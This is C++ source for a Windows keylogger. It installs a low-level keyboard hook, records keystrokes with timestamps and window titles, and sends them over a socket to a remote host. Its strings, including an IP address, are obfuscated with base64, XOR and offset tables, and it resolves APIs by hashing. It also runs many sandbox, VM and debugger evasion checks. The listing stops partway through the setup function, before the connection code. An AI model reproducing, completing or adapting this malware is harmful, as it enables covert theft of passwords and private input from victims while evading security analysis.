#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>
#include <winsock2.h>
#include <stdio.h>
#include <Windows.h>
#include <iostream>
#include <cstring>
#include <vector>
#include <sstream>
#include <string>
#include <cstdint>
#pragma comment(lib, "ws2_32")
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <cstring>
#include <vector>
#include <sstream>
#include <string>
#include <cstdint>
#include <iphlpapi.h>
#include <setupapi.h>
#include <devguid.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <strsafe.h>
#include <psapi.h>
#include <winhttp.h>
#include <shellscalingapi.h>
#include <shlobj.h>
#include <io.h>

#pragma comment(lib, "Shcore.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")

HHOOK hKeyHook;
SOCKET WSock;
using namespace std;
typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef HHOOK (WINAPI *pSetWindowsHookExA)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL (WINAPI *pUnhookWindowsHookEx)(HHOOK);
typedef HMODULE(WINAPI *GetModuleHandleW_t)(LPCWSTR);
typedef SOCKET(WINAPI *WSASocketFunc)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
typedef NTSTATUS(NTAPI *fnNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

const wchar_t *VIRTUAL_DEVICES[] = {
    L"VBOX",    
    L"VMWARE",  
    L"VIRTUAL", 
    L"QEMU"    
};

const wchar_t *SUSPICIOUS_PROCESSES[] = {
    L"PROCEXP.EXE", L"PROCEXP64.EXE", L"TCPVIEW.EXE", L"TCPVIEW64.EXE", L"PROCMON.EXE", L"PROCMON64.EXE",
    L"VMMAP.EXE", L"VMMMAP64.EXE", L"PORTMON.EXE", L"PROCESSLASSO.EXE", L"WIRESHARK.EXE",
    L"FIDDLER.EXE", L"IDA.EXE", L"IDA64.EXE", L"IMMUNITYDEBUGGER.EXE", L"WINDUMP.EXE", L"X64DBG.EXE",
    L"X32DBG.EXE", L"OLLYDBG.EXE", L"PROCESSHACKER.EXE", L"IDAQ.EXE", L"IDAQ64.EXE", L"AUTORUNS.EXE",
    L"DUMPCAP.EXE", L"DE4DOT.EXE", L"HOOKEXPLORER.EXE", L"ILSPY.EXE", L"LORDPE.EXE", L"DNSPY.EXE",
    L"PETOOLS.EXE", L"AUTORUNSC.EXE", L"RESOURCEHACKER.EXE", L"FILEMON.EXE", L"REGMON.EXE", L"WINDBG.EXE"};

std::string getTimeStamp() {
    time_t now = time(nullptr);
    tm* ltm = localtime(&now);
    std::stringstream ss;
    ss << "[" << std::setfill('0') << std::setw(2) << ltm->tm_hour << ":"
       << std::setfill('0') << std::setw(2) << ltm->tm_min << ":"
       << std::setfill('0') << std::setw(2) << ltm->tm_sec << "] ";
    return ss.str();
}

std::string getWindowTitleUTF8() {
    wchar_t wTitle[256] = {0};
    char utf8Title[1024] = {0};
    
    GetWindowTextW(GetForegroundWindow(), wTitle, 256);
    WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, utf8Title, sizeof(utf8Title), NULL, NULL);
    
    return std::string(utf8Title);
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        std::stringstream keyLog;
        
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string specialKey;
            
            // Handle special keys
            switch (kbdStruct->vkCode) {
                case VK_RETURN: specialKey = "[ENTER]"; break;
                case VK_BACK: specialKey = "[BACKSPACE]"; break;
                case VK_TAB: specialKey = "[TAB]"; break;
                case VK_SHIFT: specialKey = "[SHIFT]"; break;
                case VK_CONTROL: specialKey = "[CTRL]"; break;
                case VK_MENU: specialKey = "[ALT]"; break;
                case VK_CAPITAL: specialKey = "[CAPS LOCK]"; break;
                case VK_ESCAPE: specialKey = "[ESC]"; break;
                case VK_SPACE: specialKey = "[SPACE]"; break;
                case VK_DELETE: specialKey = "[DEL]"; break;
                case VK_LEFT: specialKey = "[LEFT]"; break;
                case VK_RIGHT: specialKey = "[RIGHT]"; break;
                case VK_UP: specialKey = "[UP]"; break;
                case VK_DOWN: specialKey = "[DOWN]"; break;
                default: {
                    wchar_t keyNameW[64] = {0};
                    char utf8Output[256] = {0};
                    int msg = 1 + (kbdStruct->scanCode << 16) + (kbdStruct->flags << 24);
                    GetKeyNameTextW(msg, keyNameW, 64);
                    WideCharToMultiByte(CP_UTF8, 0, keyNameW, -1, utf8Output, sizeof(utf8Output), NULL, NULL);
                    specialKey = utf8Output;
                }
            }

            keyLog << getTimeStamp() 
                << "[" << getWindowTitleUTF8() << "] "
                << "Key: " << specialKey << " "
                << "VK: 0x" << std::hex << kbdStruct->vkCode << "\n";

                  
            std::string logData = keyLog.str();
            send(WSock, logData.c_str(), logData.length(), 0);
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

uint32_t GetHash(const std::string &functionName)
{
    uint32_t hash = 0;
    for (char c : functionName)
    {
        hash = (hash >> 13) | (hash << 19); // Rotate bits
        hash += c;
    }
    return hash;
}

std::string base64_decode(const std::string &in)
{
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++)
        T[base64_chars[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : in)
    {
        if (T[c] == -1)
            break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0)
        {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

string deObfuscation(const vector<int> &offsets, const char *big_string)
{
    string result;
    for (int offset : offsets)
    {
        result += big_string[offset];
    }
    return result;
}

string simpleXOR(const string &data, char key)
{
    string result = data;
    for (size_t i = 0; i < data.size(); i++)
    {
        result[i] = data[i] ^ key;
    }
    return result;
}

string decodeString(const int *encoded, int size, const char *big_string, char key)
{
    // Deobfuscate the Base64 encoded string
    string base64Encoded;
    for (int i = 0; i < size; i++)
    {
        base64Encoded += big_string[encoded[i]];
    }

    // Decode Base64
    string decoded = base64_decode(base64Encoded);

    // Decrypt
    string decrypted = simpleXOR(decoded, key);

    // Parse back to vector<int>
    vector<int> decryptedOffsets;
    stringstream ss(decrypted);
    string token;
    while (getline(ss, token, ','))
    {
        if (!token.empty())
        {
            decryptedOffsets.push_back(stoi(token));
        }
    }

    // Final deobfuscation
    return deObfuscation(decryptedOffsets, big_string);
}

bool checkSystemResources()
{

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2)
        return false;


    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 2048)
        return false;

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE)
        return false;

    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, NULL))
    {
        CloseHandle(hDevice);
        return false;
    }

    DWORD diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder *
                       (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    CloseHandle(hDevice);
    if (diskSizeGB < 100)
        return false;

    return true;
}


bool CheckHDDName()
{
    HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);
    if (hDeviceInfo == INVALID_HANDLE_VALUE)
        return true;

    SP_DEVINFO_DATA deviceInfoData;
    deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);

    if (!SetupDiEnumDeviceInfo(hDeviceInfo, 0, &deviceInfoData))
        return true;

    DWORD propertyBufferSize = 0;
    SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &propertyBufferSize);
    PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);

    if (HDDName)
    {
        SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);
        CharUpperW(HDDName);

        for (const wchar_t *virtualDevice : VIRTUAL_DEVICES)
        {
            if (wcsstr(HDDName, virtualDevice))
            {
                HeapFree(GetProcessHeap(), 0, HDDName);
                return false; 
            }
        }
        HeapFree(GetProcessHeap(), 0, HDDName);
    }
    return true;
}


bool CheckApplicationName()
{
    wchar_t currentProcessPath[MAX_PATH + 1];
    GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);
    CharUpperW(currentProcessPath);
    if (!wcsstr(currentProcessPath, L"KOYLEGGER.EXE"))
        return false;
    return true;
}


bool CheckSuspiciousProcesses()
{
    PROCESSENTRY32W processEntry = {0};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    WCHAR processName[MAX_PATH + 1];

    if (Process32FirstW(hSnapshot, &processEntry))
    {
        do
        {
            StringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);
            CharUpperW(processName);

            for (const wchar_t *suspiciousProcess : SUSPICIOUS_PROCESSES)
            {
                if (wcsstr(processName, suspiciousProcess))
                {
                    CloseHandle(hSnapshot);
                    return false; 
                }
            }
        } while (Process32NextW(hSnapshot, &processEntry));
    }

    CloseHandle(hSnapshot);
    return true; 
}


DWORD GetParentPID(DWORD pid)
{
    DWORD ppid = 0;
    PROCESSENTRY32W processEntry = {0};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(hSnapshot, &processEntry))
    {
        do
        {
            if (processEntry.th32ProcessID == pid)
            {
                ppid = processEntry.th32ParentProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &processEntry));
    }
    CloseHandle(hSnapshot);
    return ppid;
}


bool CheckParentProcess()
{
    DWORD parentPid = GetParentPID(GetCurrentProcessId());
    WCHAR parentName[MAX_PATH + 1];
    DWORD dwParentName = MAX_PATH;
    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
    if (hParent == NULL)
        return false;

    if (QueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName))
    {
        CloseHandle(hParent);
        CharUpperW(parentName);
        if (wcsstr(parentName, L"WINDBG.EXE"))
            return false;
    }
    else
    {
        CloseHandle(hParent);
        return false;
    }

    return true;
}


DWORD g_dwMouseClicks = 0x00;
HHOOK g_hMouseHook = 0x00;
DWORD g_dwLastPrintTime = 0;
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN)
    {
        g_dwMouseClicks++;
        printf("Mouse clicks: %d\n", g_dwMouseClicks);

        if (g_dwMouseClicks >= 5)
        {

            UnhookWindowsHookEx(g_hMouseHook);
            PostQuitMessage(0); 
        }
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}


BOOL IsVirtualEnvUserInteraction(IN DWORD dwMonitorTimeInSec, IN OPTIONAL DWORD dwNmbrOfMouseClicks)
{
    DWORD dwMouseClicks = 5; 

    if (!dwMonitorTimeInSec)
        return true;

    if (dwNmbrOfMouseClicks && dwNmbrOfMouseClicks > 1)
        dwMouseClicks = dwNmbrOfMouseClicks;

    g_dwMouseClicks = 0;

    if (!(g_hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0)))
    {
        printf("[!] SetWindowsHookExW Failed With Error: %d \n", GetLastError());
        return false;
    }

    MSG Msg;
    DWORD startTime = GetTickCount();
    while (GetTickCount() - startTime <= dwMonitorTimeInSec * 1000)
    {
        if (PeekMessage(&Msg, NULL, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }

        if (g_dwMouseClicks >= dwMouseClicks)
        {
            UnhookWindowsHookEx(g_hMouseHook);
            return true; 
        }
    }

    UnhookWindowsHookEx(g_hMouseHook);
    return false; 
}




bool CheckRecentFiles()
{
    PWSTR recentFolder = NULL;
    SHGetKnownFolderPath(FOLDERID_Recent, 0, NULL, &recentFolder);
    wchar_t recentFolderFiles[MAX_PATH + 1] = L"";
    StringCbCatW(recentFolderFiles, MAX_PATH, recentFolder);
    StringCbCatW(recentFolderFiles, MAX_PATH, L"\\*");
    int numberOfRecentFiles = 0;
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW(recentFolderFiles, &findFileData);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            numberOfRecentFiles++;
        } while (FindNextFileW(hFind, &findFileData));
        FindClose(hFind);
    }
    CoTaskMemFree(recentFolder);
    if (numberOfRecentFiles >= 2)
        numberOfRecentFiles -= 2; 
    return numberOfRecentFiles >= 20;
}


bool checkForInternalFile()
{
    const char *filePath = "C:\\INTERNAL\\__empty";
    return (_access(filePath, 0) == -1); 
}


bool checkSuspiciousImport()
{
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (hKernel32 == NULL) {
        return false;
    }
    
    return (GetProcAddress(hKernel32, "MpVmp32Entry") == NULL);
}


bool checkSufficientProcesses()
{
    DWORD processIds[1024];
    DWORD bytesReturned;
    if (!EnumProcesses(processIds, sizeof(processIds), &bytesReturned))
    {
        return false;
    }

    DWORD processCount = bytesReturned / sizeof(DWORD);
    printf("Number of running processes: %d\n", processCount);


    return (processCount >= 50);
}


bool checkSufficientUptime()
{
    ULONGLONG uptimeSeconds = GetTickCount64() / 1000;
    ULONGLONG uptimeMinutes = uptimeSeconds / 60;
    
    printf("System uptime: %llu minutes\n", uptimeMinutes);


    return (uptimeMinutes >= 25);
}


bool checkNotBeingDebugged()
{
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    
    if (pPEB->BeingDebugged)
    {
        printf("Debugger detected\n");
        return false;
    }
    
    printf("No debugger detected\n");
    return true;
}


bool checkNoDebugPort()
{
    typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

    PNtQueryInformationProcess NtQueryInformationProcess = 
        (PNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), 
            "NtQueryInformationProcess"
        );

    if (NtQueryInformationProcess == NULL)
    {
        printf("Failed to get NtQueryInformationProcess\n");
        return false;
    }

    DWORD64 debugPort = 0;
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessDebugPort,
        &debugPort,
        sizeof(debugPort),
        NULL
    );

    if (NT_SUCCESS(status) && debugPort == 0)
    {
        printf("No debug port detected\n");
        return true;
    }
    
    printf("Debug port detected\n");
    return false;
}


bool checkNtGlobalFlag()
{
    #define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
    #define FLG_HEAP_ENABLE_FREE_CHECK   0x20
    #define FLG_HEAP_VALIDATE_PARAMETERS 0x40
    #define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)

    PDWORD pNtGlobalFlag = (PDWORD)(__readgsqword(0x60) + 0xBC);
    
    if ((*pNtGlobalFlag) & NT_GLOBAL_FLAG_DEBUGGED)
    {
        printf("Debugger flags detected in NtGlobalFlag\n");
        return false;
    }
    
    printf("No debugger flags detected in NtGlobalFlag\n");
    return true;
}


bool checkHeapFlags()
{
    PDWORD pHeapFlags = (PDWORD)((PBYTE)GetProcessHeap() + 0x70);
    PDWORD pHeapForceFlags = (PDWORD)((PBYTE)GetProcessHeap() + 0x74);
    
    if ((*pHeapFlags & HEAP_GROWABLE) == 0 || *pHeapForceFlags != 0)
    {
        printf("Suspicious heap flags detected\n");
        return false;
    }
    
    printf("Heap flags appear normal\n");
    return true;
}


bool checkDebugArtifacts()
{
    typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

    PNtQueryInformationProcess NtQueryInformationProcess = 
        (PNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), 
            "NtQueryInformationProcess"
        );

    if (NtQueryInformationProcess == NULL)
    {
        printf("Failed to get NtQueryInformationProcess\n");
        return false;
    }

    HANDLE hProcessDebugObject = NULL;
    DWORD processDebugFlags = 0;
    NTSTATUS status;

    status = NtQueryInformationProcess(
        GetCurrentProcess(),
        (PROCESSINFOCLASS)0x1E, 
        &hProcessDebugObject,
        sizeof(HANDLE),
        NULL
    );

    if (NT_SUCCESS(status) && hProcessDebugObject != NULL)
    {
        printf("Debug object handle detected\n");
        return false;
    }

    status = NtQueryInformationProcess(
        GetCurrentProcess(),
        (PROCESSINFOCLASS)0x1F,
        &processDebugFlags,
        sizeof(DWORD),
        NULL
    );

    if (NT_SUCCESS(status) && processDebugFlags == 0)
    {
        printf("Debug flags indicate debugging\n");
        return false;
    }

    printf("No debug artifacts detected\n");
    return true;
}


bool checkDebugRegisters()
{
    CONTEXT context = {};
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if (!GetThreadContext(GetCurrentThread(), &context))
    {
        printf("Failed to get thread context\n");
        return false;
    }
    
    if (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0)
    {
        printf("Debug registers are set\n");
        return false;
    }
    
    printf("No debug registers are set\n");
    return true;
}


void initializeKeylogger() {
    const char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._0123456789=/+";
    char key = 'K';
    int w_s_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 35, 13, 4, 56, 3, 60, 5, 32, 3, 60, 2, 12, 3, 59, 4, 56, 3, 60, 5, 12, 2, 64};                                                                                                       // WSAStartup
    int w_c_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 4, 49, 39, 13, 4, 13, 63, 13, 4, 13, 7, 13, 4, 13, 7, 13, 5, 56, 3, 59, 51, 57, 15, 24, 51, 22, 64, 64};                                                                                                   // WSAConnect
    int w_soc_offset[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 63, 13, 4, 48, 3, 60, 4, 56, 3, 65, 51, 57, 15, 24, 51, 22, 64, 64};                                                                                                          // WSASocket
    int h_t_o[] = {5, 32, 3, 60, 2, 12, 3, 60, 5, 56, 3, 60, 4, 32, 3, 60, 2, 56, 2, 64};                                                                                                                                                                                  // htons
    int i_a_o[] = {2, 56, 3, 60, 4, 32, 3, 65, 51, 57, 15, 24, 51, 57, 59, 58, 51, 57, 19, 13, 4, 32, 3, 58, 51, 57, 15, 62, 51, 22, 64, 64};                                                                                                                              // inet_addr
    int w_s_2_32lld[] = {4, 49, 11, 13, 4, 13, 39, 13, 5, 13, 55, 13, 5, 13, 7, 13, 5, 13, 23, 13, 5, 13, 55, 13, 5, 13, 11, 13, 4, 32, 3, 60, 4, 12, 3, 60, 4, 12, 2, 64};                                                                          // ws2_32.dll
    int k_renel_32[] = {4, 13, 19, 13, 5, 56, 3, 60, 5, 32, 3, 60, 4, 32, 3, 65, 51, 57, 15, 60, 51, 57, 59, 62, 51, 57, 59, 63, 51, 57, 59, 59, 51, 57, 7, 13, 4, 13, 15, 13, 4, 13, 15, 13};                                                       // kernel32.dll
    int get_proc_addr[] = {4, 33, 11, 13, 5, 56, 3, 60, 2, 12, 3, 65, 4, 12, 3, 60, 5, 32, 3, 60, 5, 56, 3, 59, 51, 57, 11, 63, 51, 57, 7, 13, 4, 32, 3, 60, 5, 32, 3, 65, 51, 57, 15, 25, 51, 57, 15, 25, 51, 22, 64, 64};                          // GetProcAddress
    int ipaddr_offset[] = { 5, 13, 23, 13, 5, 13, 11, 13, 5, 49, 11, 13, 5, 13, 35, 13, 5, 13, 11, 13, 5, 13, 55, 13, 5, 13, 63, 13, 5, 13, 11, 13, 5, 49, 19, 13, 5, 13, 63, 13 };
    int w_s_cl[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 4, 49, 39, 13, 4, 13, 15, 13, 5, 56, 3, 61, 51, 57, 15, 58, 51, 57, 11, 61, 51, 57, 15, 66, 51, 22, 64, 64};
    int u_ser32lld[] = {5, 57, 55, 13, 4, 13, 39, 13, 5, 56, 3, 60, 5, 32, 3, 66, 5, 32, 3, 66, 5, 48, 3, 66, 4, 48, 3, 58, 51, 57, 15, 60, 51, 57, 15, 60, 51, 22, 64, 64};
    int set_w_h_e_x[] = {5, 57, 63, 13, 5, 56, 3, 60, 2, 12, 3, 65, 2, 56, 3, 25, 51, 57, 15, 58, 51, 57, 7, 13, 4, 13, 63, 13, 4, 49, 11, 13, 4, 13, 39, 13, 4, 33, 7, 13, 4, 13, 63, 13, 4, 13, 63, 13, 4, 13, 19, 13, 4, 33, 19, 13, 4, 49, 7, 13, 4, 49, 55, 13};
    int set_w_unho_ex[] = {5, 57, 55, 13, 4, 13, 7, 13, 5, 32, 3, 60, 5, 56, 3, 60, 5, 56, 3, 60, 4, 56, 3, 65, 2, 56, 3, 25, 51, 57, 15, 58, 51, 57, 7, 13, 4, 13, 63, 13, 4, 49, 11, 13, 4, 13, 39, 13, 4, 33, 7, 13, 4, 13, 63, 13, 4, 13, 63, 13, 4, 13, 19, 13, 4, 33, 19, 13, 4, 49, 7, 13};
    int get_mess_A_offsec[] = {4, 33, 11, 13, 5, 56, 3, 60, 2, 12, 3, 58, 2, 56, 3, 65, 51, 57, 15, 25, 51, 57, 15, 25, 51, 57, 19, 13, 5, 48, 3, 65, 51, 57, 11, 63, 51, 22, 64, 64};
    int trans_mess_offsec[] = {5, 57, 59, 13, 4, 13, 23, 13, 4, 56, 3, 60, 4, 32, 3, 60, 2, 56, 3, 60, 4, 12, 3, 61, 51, 57, 15, 24, 51, 57, 63, 13, 4, 33, 39, 13, 5, 56, 3, 60, 2, 56, 3, 60, 2, 56, 3, 61, 51, 57, 55, 13, 5, 56, 2, 64};
    int dis_patch_mess_offsec[] = {4, 49, 35, 13, 2, 56, 3, 60, 2, 56, 3, 60, 5, 12, 3, 61, 51, 57, 15, 24, 51, 57, 11, 13, 5, 32, 3, 58, 2, 56, 3, 65, 51, 57, 15, 25, 51, 57, 15, 25, 51, 57, 19, 13, 5, 48, 3, 65, 51, 22, 64, 64};
    int clo_soc_offset[] = {4, 48, 3, 60, 4, 12, 3, 60, 5, 56, 3, 60, 2, 56, 3, 65, 51, 57, 15, 25, 51, 57, 15, 65, 51, 57, 11, 13, 4, 13, 19, 13, 5, 56, 3, 60, 2, 12, 2, 64};
    int w_s_a_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 63, 13, 4, 48, 3, 60, 4, 56, 3, 65, 51, 57, 15, 24, 51, 57, 11, 63, 51, 22, 64, 64};
    int g_et_mod_u_l_o_handelW[] = {4, 33, 11, 13, 5, 56, 3, 60, 2, 12, 3, 58, 2, 56, 3, 60, 5, 56, 3, 58, 51, 57, 11, 61, 51, 57, 15, 60, 51, 57, 63, 13, 4, 33, 7, 13, 4, 56, 3, 60, 4, 32, 3, 58, 51, 57, 15, 60, 51, 57, 63, 13, 5, 57, 39, 13};
    HMODULE w_s2_32lib = LoadLibraryA(decodeString(w_s_2_32lld, sizeof(w_s_2_32lld) / sizeof(w_s_2_32lld[0]), big_string, key).c_str());

    // api hash technique
    HMODULE ker_nel_32lld = LoadLibraryA(decodeString(k_renel_32, sizeof(k_renel_32) / sizeof(k_renel_32[0]), big_string, key).c_str());
    HMODULE u_ser32lib = LoadLibraryA(decodeString(u_ser32lld, sizeof(u_ser32lld) / sizeof(u_ser32lld[0]), big_string, key).c_str());
    uint32_t targetHash = GetHash(decodeString(get_proc_addr, sizeof(get_proc_addr) / sizeof(get_proc_addr[0]), big_string, key).c_str());

    // Get the address of the Export Directory
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)ker_nel_32lld;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE *)ker_nel_32lld + pDOSHeader->e_lfanew);
    DWORD exportDirectoryRVA = pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    // Get the Export Directory and its functions
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)ker_nel_32lld + exportDirectoryRVA);
    DWORD *functionNames = (DWORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfNames);
    DWORD *functionAddresses = (DWORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfFunctions);
    WORD *nameOrdinals = (WORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfNameOrdinals);

    // Declare the GetProcAddress function pointer outside the loop
    pGetProcAddress GetProcAddressFn = nullptr;

    // Loop through the exports
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
    {
        const char *functionName = (const char *)((BYTE *)ker_nel_32lld + functionNames[i]);
        uint32_t functionHash = GetHash(functionName);

        if (functionHash == targetHash)
        {
            // We've found the function we're looking for
            DWORD functionAddressRVA = functionAddresses[nameOrdinals[i]];
            GetProcAddressFn = (pGetProcAddress)((BYTE *)ker_nel_32lld + functionAddressRVA);
            break; // Exit the loop once we've found the function
        }
    }

    FARPROC w_sa_St_ar_tup = GetProcAddressFn(w_s2_32lib, decodeString(w_s_o, sizeof(w_s_o) / sizeof(w_s_o[0]), big_string, key).c_str());
    FARPROC Connectsaw = GetProcAddressFn(w_s2_32lib, decodeString(w_c_o, sizeof(w_c_o) / sizeof(w_c_o[0]), big_string, key).c_str());
    FARPROC wsaSocket = GetProcAddressFn(w_s2_32lib, decodeString(w_soc_offset, sizeof(w_soc_offset) / sizeof(w_soc_offset[0]), big_string, key).c_str());
    FARPROC htonsFunc = GetProcAddressFn(w_s2_32lib, decodeString(h_t_o, sizeof(h_t_o) / sizeof(h_t_o[0]), big_string, key).c_str());
    FARPROC inetAddr = GetProcAddressFn(w_s2_32lib, decodeString(i_a_o, sizeof(i_a_o) / sizeof(i_a_o[0]), big_string, key).c_str());
    FARPROC WsAClo = GetProcAddressFn(w_s2_32lib, decodeString(w_s_cl, sizeof(w_s_cl) / sizeof(w_s_cl[0]), big_string, key).c_str());
    FARPROC setWindow_hookE_x = GetProcAddressFn(u_ser32lib, decodeString(set_w_h_e_x, sizeof(set_w_h_e_x) / sizeof(set_w_h_e_x[0]), big_string, key).c_str());
    FARPROC setWindow_Unhook_Ex = GetProcAddressFn(u_ser32lib, decodeString(set_w_unho_ex, sizeof(set_w_unho_ex) / sizeof(set_w_unho_ex[0]), big_string, key).c_str());
    FARPROC get_mess_A = GetProcAddressFn(u_ser32lib, decodeString(get_mess_A_offsec, sizeof(get_mess_A_offsec) / sizeof(get_mess_A_offsec[0]), big_string, key).c_str());
    FARPROC trans_mess = GetProcAddressFn(u_ser32lib, decodeString(trans_mess_offsec, sizeof(trans_mess_offsec) / sizeof(trans_mess_offsec[0]), big_string, key).c_str());
    FARPROC dis_patch_mess = GetProcAddressFn(u_ser32lib, decodeString(dis_patch_mess_offsec, sizeof(dis_patch_mess_offsec) / sizeof(dis_patch_mess_offsec[0]), big_string, key).c_str());
    FARPROC clo_soc = GetProcAddressFn(w_s2_32lib, decodeString(clo_soc_offset, sizeof(clo_soc_offset) / sizeof(clo_soc_offset[0]), big_string, key).c_str());
    // Initialize Winsock
    WSADATA wsaData;
    reinterpret_cast<int(WINAPI *)(WORD, LPWSADATA)>(w_sa_St_ar_tup)(MAKEWORD(2, 2), &wsaData);

    // Create socket and connect
    string original_ws_2_32_dl_l = decodeString(w_s_2_32lld, sizeof(w_s_2_32lld) / sizeof(w_s_2_32lld[0]), big_string, key).c_str();
    wstring wide_original_ws_2_32_dl_l(original_ws_2_32_dl_l.begin(), original_ws_2_32_dl_l.end());
